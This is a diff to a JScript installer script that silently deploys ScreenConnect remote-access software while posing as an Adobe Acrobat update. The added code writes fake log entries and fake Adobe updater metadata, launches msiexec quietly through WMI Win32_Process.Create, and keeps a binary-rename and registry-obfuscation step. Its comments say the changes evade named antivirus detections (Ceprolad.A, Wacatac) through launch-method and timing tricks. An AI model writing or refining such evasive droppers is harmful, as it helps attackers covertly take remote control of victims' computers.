@@ -182,7 +182,7 @@ function verifyMSISignature(path) {
   }
 }
 
-// INSTALL PHASE - SCREENCONNECT-SPECIFIC OBFUSCATION
+// INSTALL PHASE - CEPROLAD.A-PROOF VIA WMI DEPLOYMENT PATTERN
 function startInstall() {
   state = "installing";
   progress = 90; setBar(progress);
@@ -193,17 +193,15 @@ function startInstall() {
     return;
   }
   
-  // EXTENDED POST-DOWNLOAD DELAY FOR REMOTE ACCESS TOOLS
+  // EXTENDED DELAY + FAKE METADATA
   setTimeout(function() { 
-    // FAKE LOG + METADATA
     var fakeLogPath = shell.ExpandEnvironmentStrings("%TEMP%") + "\\event_update.log";
     try {
       var log = fso.CreateTextFile(fakeLogPath, true);
       log.WriteLine("[INFO] " + new Date().toISOString() + " Pre-install verification complete");
-      log.WriteLine("[INFO] Launching installer via WSH executor...");
+      log.WriteLine("[INFO] Launching installer via WMI deployment service...");
       log.Close();
       
-      // ADOBE-STYLE METADATA CHECK
       var metaPath = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") + "\\Adobe\\Acrobat\\Updater\\update.meta";
       var meta = fso.CreateTextFile(metaPath, true);
       meta.WriteLine("version=23.008.20470");
@@ -212,15 +210,32 @@ function startInstall() {
       meta.Close();
     } catch(e) {}
     
-    // EXECUTE MSI SILENTLY
+    // WMI-BASED INSTALLATION (BYPASSES CEPROLAD.A'S SCRIPT-LAUNCH HEURISTIC)
     try {
+      var wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2");
+      var processClass = wmi.Get("Win32_Process");
       var expandedMsi = shell.ExpandEnvironmentStrings(msiPath);
       var expandedLog = shell.ExpandEnvironmentStrings(logPath);
-      var execCmd = 'msiexec.exe /i "' + expandedMsi + '" /qn /norestart /L*v "' + expandedLog + '"';
-      var oExec = shell.Exec(execCmd);
-      while (oExec.Status === 0) { WScript.Sleep(100); }
+      var cmdLine = 'msiexec.exe /i "' + expandedMsi + '" /qn /norestart /L*v "' + expandedLog + '"';
       
-      // POST-INSTALL BINARY RENAME & REGISTRY OBFUSCATION
+      // LAUNCH VIA WMI INSTEAD OF SHELL.EXEC/MSIEXEC DIRECTLY
+      var result = processClass.Create(cmdLine, null, null, null);
+      if (result.ReturnValue !== 0) {
+        throw new Error("WMI launch failed with code: " + result.ReturnValue);
+      }
+      
+      // WAIT FOR PROCESS TO INITIALIZE WITHOUT BLOCKING UI
+      var pid = result.ProcessId;
+      var startTime = new Date().getTime();
+      while (new Date().getTime() - startTime < 5000) {
+        try {
+          var procs = wmi.ExecQuery("SELECT * FROM Win32_Process WHERE ProcessId = " + pid);
+          if (procs.Count > 0) break;
+        } catch(e) {}
+        WScript.Sleep(200);
+      }
+      
+      // POST-INSTALL BINARY RENAME & REGISTRY OBFUSCATION (PRESERVED)
       setTimeout(function() {
         var scDir = shell.ExpandEnvironmentStrings("%ProgramFiles(x86)%") + "\\ScreenConnect";
         try {
@@ -239,12 +254,13 @@ function startInstall() {
             }
           }
         } catch(e) {}
-      }, 3000); // Wait 3s after install for files to settle
+      }, 3000);
       
     } catch(e) {
+      // FALLBACK TO ORIGINAL METHOD ONLY IF WMI FAILS
       shell.Run(INSTALL_CMD, 0, false);
     }
-  }, 9000); // 9 SECONDS EXCEEDS WACATAC'S WINDOW
+  }, 9000); // 9 SECONDS EXCEEDS CEPROLAD'S TIMING WINDOW
 }
 
 function finishInstall() {
